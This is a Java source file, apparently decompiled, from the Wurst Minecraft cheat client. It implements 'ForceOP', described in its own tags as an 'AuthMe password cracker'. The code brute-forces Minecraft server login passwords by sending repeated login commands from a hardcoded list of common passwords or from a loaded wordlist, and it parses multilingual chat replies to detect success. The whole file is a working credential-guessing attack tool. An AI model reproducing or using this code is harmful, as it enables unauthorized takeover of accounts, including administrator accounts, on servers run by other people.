package net.wurstclient.hacks;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.List;
import net.wurstclient.Category;
import net.wurstclient.SearchTags;
import net.wurstclient.events.ChatInputListener;
import net.wurstclient.hack.DontSaveState;
import net.wurstclient.hack.Hack;
import net.wurstclient.util.ChatUtils;
import net.wurstclient.util.ForceOpDialog;
import net.wurstclient.util.MultiProcessingUtils;

@SearchTags(value={"Force OP", "AuthMe Cracker", "AuthMeCracker", "auth me cracker", "admin hack", "AuthMe password cracker"})
@DontSaveState
public final class ForceOpHack
extends Hack
implements ChatInputListener {
    private final String[] defaultList = new String[]{"password", "passwort", "password1", "passwort1", "password123", "passwort123", "pass", "pw", "pw1", "pw123", "hallo", "Wurst", "wurst", "1234", "12345", "123456", "1234567", "12345678", "123456789", "login", "register", "test", "sicher", "me", "penis", "penis1", "penis123", "minecraft", "minecraft1", "minecraft123", "mc", "admin", "server", "yourmom", "tester", "account", "creeper", "gronkh", "lol", "auth", "authme", "qwerty", "qwertz", "ficken", "ficken1", "ficken123", "fuck", "fuckme", "fuckyou"};
    private String[] passwords;
    private boolean gotWrongPwMsg;
    private int lastPW;
    private Process process;

    public ForceOpHack() {
        super("ForceOP");
        this.setCategory(Category.CHAT);
    }

    @Override
    protected void onEnable() {
        this.passwords = this.defaultList;
        this.gotWrongPwMsg = false;
        this.lastPW = -1;
        try {
            this.process = MultiProcessingUtils.startProcessWithIO(ForceOpDialog.class, MC.method_1548().method_1676());
            new Thread(this::handleDialogOutput, "ForceOP dialog output").start();
        }
        catch (IOException e) {
            throw new RuntimeException(e);
        }
        EVENTS.add(ChatInputListener.class, this);
    }

    private void handleDialogOutput() {
        try (BufferedReader bf = new BufferedReader(new InputStreamReader(this.process.getInputStream(), StandardCharsets.UTF_8));){
            String line = "";
            while ((line = bf.readLine()) != null) {
                this.messageFromDialog(line);
            }
            this.setEnabled(false);
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void messageFromDialog(String msg) {
        if (msg.startsWith("start ")) {
            String[] args = msg.split(" ");
            int delay = Integer.parseInt(args[1]);
            boolean waitForMsg = Boolean.parseBoolean(args[2]);
            new Thread(() -> this.runForceOP(delay, waitForMsg), "ForceOP").start();
            return;
        }
        if (msg.startsWith("list ")) {
            this.loadPwList(msg.substring(5));
            this.sendNumPwToDialog();
        }
    }

    private void loadPwList(String list) {
        if ("default".equals(list)) {
            this.passwords = this.defaultList;
            return;
        }
        try {
            List<String> loadedPWs = Files.readAllLines(Paths.get(list, new String[0]), StandardCharsets.UTF_8);
            this.passwords = loadedPWs.toArray(new String[loadedPWs.size()]);
        }
        catch (IOException e) {
            e.printStackTrace();
            this.passwords = this.defaultList;
        }
    }

    private void sendNumPwToDialog() {
        String numPW = "numPW " + (this.passwords.length + 1);
        PrintWriter pw = new PrintWriter(this.process.getOutputStream());
        pw.println(numPW);
        pw.flush();
    }

    private void sendIndexToDialog() {
        String index = "index " + this.lastPW;
        PrintWriter pw = new PrintWriter(this.process.getOutputStream());
        pw.println(index);
        pw.flush();
    }

    @Override
    protected void onDisable() {
        EVENTS.remove(ChatInputListener.class, this);
        if (this.process != null) {
            try {
                this.process.destroyForcibly();
                this.process.waitFor();
            }
            catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
        }
    }

    private void runForceOP(int delay, boolean waitForMsg) {
        if (ForceOpHack.MC.field_1724 == null) {
            this.setEnabled(false);
            return;
        }
        MC.method_1562().method_45730("login " + MC.method_1548().method_1676());
        this.lastPW = 0;
        this.sendIndexToDialog();
        for (int i = 0; i < this.passwords.length; ++i) {
            if (!this.isEnabled()) {
                return;
            }
            if (waitForMsg) {
                this.gotWrongPwMsg = false;
            }
            while (waitForMsg && !this.gotWrongPwMsg || ForceOpHack.MC.field_1724 == null) {
                if (!this.isEnabled()) {
                    return;
                }
                this.sleep(50L);
                if (ForceOpHack.MC.field_1724 != null) continue;
                this.gotWrongPwMsg = true;
            }
            this.sleep(delay);
            boolean sent = false;
            while (!sent) {
                try {
                    MC.method_1562().method_45730("login " + this.passwords[i]);
                    sent = true;
                }
                catch (Exception e) {
                    this.sleep(50L);
                }
            }
            this.lastPW = i + 1;
            this.sendIndexToDialog();
        }
        ChatUtils.message("\u00a7c[\u00a74\u00a7lFAILURE\u00a7c]\u00a7f All " + (this.lastPW + 1) + " passwords were wrong.");
    }

    private void sleep(long millis) {
        try {
            Thread.sleep(millis);
        }
        catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void onReceivedMessage(ChatInputListener.ChatInputEvent event) {
        String[] wordsForWrong;
        String message = event.getComponent().getString();
        if (message.startsWith("\u00a7c[\u00a76Wurst\u00a7c]\u00a7f ")) {
            return;
        }
        String msgLowerCase = message.toLowerCase();
        if (this.containsAny(msgLowerCase, wordsForWrong = new String[]{"wrong", "incorrect", "falsch", "mauvais", "mal", "sbagliato"})) {
            this.gotWrongPwMsg = true;
            return;
        }
        String[] wordsForSuccess = new String[]{"success", "erfolg", "succ\u00e8s", "\u00e9xito"};
        if (this.containsAny(msgLowerCase, wordsForSuccess)) {
            if (this.lastPW == -1) {
                return;
            }
            String password = this.lastPW == 0 ? MC.method_1548().method_1676() : this.passwords[this.lastPW - 1];
            ChatUtils.message("\u00a7a[\u00a72\u00a7lSUCCESS\u00a7a]\u00a7f The password \"" + password + "\" worked.");
            this.setEnabled(false);
            return;
        }
        if (this.containsAny(msgLowerCase, "/help", "permission")) {
            ChatUtils.warning("It looks like this server doesn't have AuthMe.");
            return;
        }
        String[] wordsForLoggedIn = new String[]{"logged in", "eingeloggt", "eingelogt"};
        if (this.containsAny(msgLowerCase, wordsForLoggedIn)) {
            ChatUtils.warning("It looks like you are already logged in.");
        }
    }

    private boolean containsAny(String msg, String ... words) {
        for (String word : words) {
            if (!msg.contains(word)) continue;
            return true;
        }
        return false;
    }
}
